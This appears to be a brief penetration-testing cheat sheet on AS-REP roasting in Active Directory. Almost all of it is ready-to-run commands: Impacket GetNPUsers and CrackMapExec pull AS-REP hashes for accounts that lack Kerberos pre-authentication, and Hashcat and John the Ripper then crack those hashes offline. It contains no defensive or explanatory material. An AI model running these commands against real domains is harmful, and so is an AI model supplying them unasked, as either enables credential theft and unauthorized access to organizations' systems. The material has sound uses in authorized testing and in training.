---
legal-banner: true
---

### **Using Impacket GetNPUsers.py**

1. Update the package list:  
   ```bash
   sudo apt-get update
   ```

2. Install Impacket:  
   ```bash
   sudo apt-get install python3-impacket
   ```

3. Enumerate accounts:  
   ```bash
   impacket-GetNPUsers -dc-ip [IP_ADDRESS] example.local/ -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
   ```

4. Crack AS-REP hashes using Hashcat:  
   ```bash
   hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
   ```

5. Crack AS-REP hashes using John the Ripper:  
   ```bash
   john --format=krb5asrep --wordlist=wordlist.txt asrep_hashes.txt
   ```

### **Using CrackMapExec**

1. Enumerate accounts and retrieve AS-REP hashes:  
   ```bash
   crackmapexec smb [IP_ADDRESS] -u users.txt --asreproast asrep_hashes.txt
   ```
